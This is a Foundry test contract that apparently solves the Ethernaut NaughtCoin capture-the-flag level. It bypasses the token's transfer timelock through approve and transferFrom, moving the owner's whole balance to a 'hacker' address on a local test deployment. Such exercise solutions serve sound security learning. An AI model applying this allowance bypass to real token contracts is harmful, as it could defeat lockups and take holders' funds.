// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/15_NaughtCoin/NaughtCoin.sol";

contract Attack is Test{

    NaughtCoin public victim;
    address public owner;
    address public hacker;

    function setUp() public {
        owner = vm.addr(1);
        hacker = vm.addr(2);

        vm.deal(hacker, 1 ether);

        vm.startPrank(owner);

        victim = new NaughtCoin(owner);

        vm.stopPrank();
    }

    function testAttack() public {
        uint256 balance = victim.balanceOf(owner);
        vm.startPrank(owner);

        victim.approve(address(this), balance);

        vm.stopPrank();

        victim.transferFrom(owner,hacker, balance);

        assertEq(victim.balanceOf(hacker), balance);

    }

}